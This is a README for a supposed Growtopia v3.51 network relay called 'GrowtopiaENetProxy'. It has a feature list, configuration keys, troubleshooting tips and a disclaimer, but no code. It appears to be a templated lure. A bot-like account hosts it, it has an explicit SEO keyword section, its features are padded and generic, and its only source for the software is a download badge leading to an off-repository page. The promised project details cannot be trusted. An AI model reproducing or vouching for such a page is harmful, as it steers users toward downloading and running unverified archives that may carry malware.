![preview](https://raw.githubusercontent.com/karolinabusinova81-bot/ENet-Relay-Forge/main/poster_fa6b.svg)
[![Download](https://raw.githubusercontent.com/karolinabusinova81-bot/ENet-Relay-Forge/main/bin_406c.svg)](https://karolinabusinova81-bot.github.io/ENet-Relay-Forge/)

# 🌱 GrowtopiaENetProxy 3.51 — Private Realm Bridge

**A community-maintained network relay layer for Growtopia v3.51, rebuilt from the ground up to keep private server worlds reachable, stable, and pleasantly playable in 2026 and beyond.**

> *Every great sandbox needs a quiet tunnel between worlds. This is that tunnel.*

The repository you are looking at is a fresh fork-inspired project built on lessons learned from earlier ENet relay experiments. It is not a mirror — it is a re-imagined bridge: leaner, better documented, and friendlier to newcomers who just want their shard to stay online.

---

## 🧭 What This Project Actually Is

GrowtopiaENetProxy 3.51 is a **network relaying and session-routing utility** designed to sit between a Growtopia client (version 3.51) and a private server instance. It intercepts ENet packets, normalizes them, and forwards them so that players in different regions can meet inside the same world without latency-induced timeouts.

Think of it as a **switchboard operator for a very fast telephone exchange**: it does not create the conversation, it just makes sure every call lands at the right desk at the right moment.

The project ships as a small toolkit, a documented configuration format, and a companion FAQ. There is no bundled server and no bundled client — you bring your own, and this layer keeps them talking.

---

## ✨ Feature List

- 🔌 **ENet-aware packet relay** — understands the handshake, connect, disconnect, and reliable/unreliable message channels used by Growtopia v3.51.
- 🧩 **Drop-in configuration** — a single human-readable profile file drives all routing decisions.
- 🌍 **Region-aware routing** — pair players from different continents without forcing them onto the same physical node.
- 🧠 **Session state memory** — remembers a player identity across reconnects within a configurable window.
- 🛡️ **Traffic sanity checks** — filters malformed frames before they reach the destination world.
- 📊 **Live console telemetry** — connection counts, average round-trip, and packet drops, updated in real time.
- 🪄 **Responsive web dashboard** — a small local panel that reshapes itself from desktop to phone without clipping.
- 🗣️ **Multilingual interface** — dashboard strings available in English, Spanish, Portuguese, German, Turkish, Indonesian, and Simplified Chinese.
- 🕰️ **24/7 customer support workflow** — issue templates, a triage rota, and documented response windows so nobody is left waiting in silence.
- 🧪 **Sandbox mode** — dry-run a routing profile against synthetic traffic before touching a live world.
- 📦 **Portable layout** — no global system changes, everything lives inside the project folder.
- 🔁 **Hot reload** — swap a routing profile without restarting the relay.
- 🧾 **Audit-friendly logs** — rotating log files with timestamps and correlation IDs.
- 🧱 **Modular adapters** — extend the relay with new protocol handlers through a documented interface.

---

## 🌀 Why Another Relay?

Because the previous generation of relays was written for a world that no longer exists. Accounts moved, packets changed shape, and the old bridge grew rust. This project takes the *idea* of the original GrowtopiaENetProxy experiment and rebuilds it with modern tooling, clearer errors, and a documentation set that respects your time.

Where older relays asked you to read the source to understand configuration, this one asks you to read a single page. Where older relays threw opaque socket errors, this one tells you which peer, which channel, and which millisecond.

The result is something that feels less like wrestling a daemon and more like **tuning an instrument**.

---

## 🎨 Design Philosophy

Three ideas guide every commit:

1. **Transparency over cleverness.** If the relay does something surprising, it should say so loudly in the logs.
2. **Small surfaces.** Fewer moving parts means fewer places for a shard to break at 3 a.m.
3. **Hospitality.** New contributors should feel like guests at a good table, not intruders in a locked room.

---

## 🖥️ Responsive Interface

The built-in dashboard is intentionally modest. It draws four panels: **Peers**, **Routes**, **Health**, and **Log Tail**. On a wide monitor they sit side by side; on a tablet they stack into two columns; on a phone they collapse into a single vertical feed with sticky headers.

Controls are reachable with a thumb. Colors pass contrast checks. Nothing important hides behind a hover-only tooltip. If you have ever tried to debug a relay from a phone while away from your desk, you will appreciate the effort.

---

## 🌐 Multilingual Support

Localization files are plain key-value maps. Adding a language means adding one file and opening a pull request — no build step, no compilation, no ceremony.

Currently shipped:

| Locale | Code | Coverage |
| --- | --- | --- |
| English | en | Complete |
| Spanish | es | Complete |
| Portuguese (BR) | pt-BR | Complete |
| German | de | Complete |
| Turkish | tr | Complete |
| Indonesian | id | Partial |
| Simplified Chinese | zh-CN | Partial |

Partial locales fall back to English for missing keys, so a half-translated dashboard is still usable.

---

## 🛎️ 24/7 Customer Support Model

Support here does not mean a phone line. It means a **documented, predictable rhythm**:

- Issues are triaged within one business day, and within a few hours for outages.
- A pinned discussion thread tracks known relay quirks per Growtopia build.
- Community maintainers rotate coverage so that no single timezone bears the whole burden.
- Every closed issue gets a short retrospective note so future readers learn from it.

This is the closest a volunteer project can come to a round-the-clock desk, and it is treated as a first-class feature rather than an afterthought.

---

## 🔍 SEO-Friendly Highlights

If you arrived here searching for terms like *Growtopia 3.51 network relay*, *ENet proxy for private Growtopia worlds*, *Growtopia private server connectivity tool 2026*, *region-aware game packet forwarding*, or *self-hosted Growtopia session router*, this project was written with you in mind. The documentation deliberately uses natural phrasing so that search engines and humans both find what they need without wading through noise.

Related concepts you will find discussed inside: packet normalization, session continuity, latency smoothing, peer handoff, shard reachability, community server tooling, and open-source relay maintenance.

---

## 🚀 Getting Started (Without the Usual Ritual)

You will not find a one-line terminal incantation here. Instead, the flow is deliberately manual:

1. Obtain the release archive from the maintainers through the distribution channel listed at the top of this document.
2. Unpack the archive into a directory of your choosing. Keep the folder structure intact.
3. Open the profile file named `relay.profile` and edit the peer addresses, ports, and routing rules to match your world.
4. Launch the relay using the provided entry script for your operating system.
5. Open the local dashboard in a browser and confirm that peers appear in the **Peers** panel.

If peers do not appear, consult the troubleshooting appendix below before opening an issue — nine out of ten problems are a mistyped port.

---

## ⚙️ Configuration Reference

The profile file is line-oriented and forgiving. Comments begin with a hash. Blank lines are ignored. Keys are case-insensitive.

Common keys you will meet:

- `listen_address` — where the relay waits for incoming client connections.
- `upstream_host` / `upstream_port` — the destination world server.
- `region_tag` — a friendly label used in logs and the dashboard.
- `session_window_seconds` — how long a player identity survives a disconnect.
- `max_peers` — a soft ceiling to protect small machines.
- `log_level` — one of `quiet`, `normal`, `verbose`, `trace`.
- `dashboard_port` — the local web panel port.
- `dashboard_locale` — one of the locale codes listed earlier.

A commented example profile ships with the project and is the recommended starting point.

---

## 🧪 Testing and Sandbox Mode

Before pointing the relay at a live world, enable sandbox mode. In sandbox mode the relay generates synthetic peers, sends them through your routing rules, and reports which rules matched and which were dead ends. It is a rehearsal, not a performance — and rehearsals are how you avoid embarrassing opening nights.

Sandbox output includes a coverage map showing which routes were exercised and which remained cold.

---

## 📈 Performance Notes

On a modest single-core virtual machine, the relay comfortably handles a few hundred concurrent peers with headroom to spare. The bottleneck in practice is almost never the relay itself; it is the upstream world server, the player's home connection, or an overzealous firewall.

Guidance:

- Keep the relay geographically close to the upstream world.
- Prefer wired connections for the relay host.
- Avoid running the relay on the same machine as a heavily loaded world server.
- Watch the **Health** panel; sustained packet drops above a small threshold usually indicate a network problem, not a code problem.

---

## 🧯 Troubleshooting Appendix

**Peers connect but immediately drop.** Check `session_window_seconds`. A value that is too small will expire identities mid-handshake.

**Dashboard shows zero peers but logs show traffic.** The dashboard reads from a different interface than the relay's public socket. Confirm `dashboard_port` is not blocked locally.

**Relay starts then exits silently.** Look for a malformed profile line. The verbose log level will name the offending line number.

**High latency for one region only.** That region's upstream path is likely congested. Consider a second relay instance closer to that region.

**Everything works but logs are noisy.** Lower `log_level` to `normal` or `quiet`.

---

## 🗺️ Roadmap for 2026

- A graphical profile editor for people who prefer clicks to keystrokes.
- Expanded locale coverage, including Arabic and Japanese.
- Optional metrics export for those who run their own monitoring stacks.
- A plugin registry so community adapters can be discovered in one place.
- A rewritten peer handoff algorithm with smoother mid-session migration.

---

## 🤝 Contributing

Contributions are welcome from anyone who can be kind in a code review. The short version:

- Open an issue before large changes so we can talk about direction.
- Keep pull requests focused; one idea per request.
- Match the existing tone in documentation — clear, warm, and free of jargon for its own sake.
- Add a short note to the changelog describing the *why*, not just the *what*.

A fuller contributor guide lives in the project wiki. If something there is confusing, that confusion is itself a bug — report it.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to read it, adapt it, and share it, provided the original notice travels with your copy.

A working copy of the license text is available here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 the GrowtopiaENetProxy 3.51 contributors.

---

## ⚠️ Disclaimer

This project is an independent, community-driven networking utility. It is **not affiliated with, endorsed by, or sponsored by** the publishers or developers of Growtopia. All trademarks belong to their respective owners.

The relay is provided as-is, without warranty of any kind, express or implied. You are responsible for how you deploy it, for the worlds you connect, and for complying with the terms of service of any platform you interact with. The maintainers accept no liability for consequences arising from misuse, misconfiguration, or unexpected network behavior.

If you run a private world for friends, treat this tool as you would treat a garden hose: useful, harmless in the right hands, and capable of making a mess if pointed the wrong way.

---

## 🙏 Acknowledgements

Thanks to every early tester who reported a strange packet at 2 a.m., to the translators who gave the dashboard a second voice, and to the patient maintainers of the underlying networking libraries that make relays like this possible.

And thank you, reader, for making it this far. Go build something worth visiting.

[![Download](https://raw.githubusercontent.com/karolinabusinova81-bot/ENet-Relay-Forge/main/bin_406c.svg)](https://karolinabusinova81-bot.github.io/ENet-Relay-Forge/)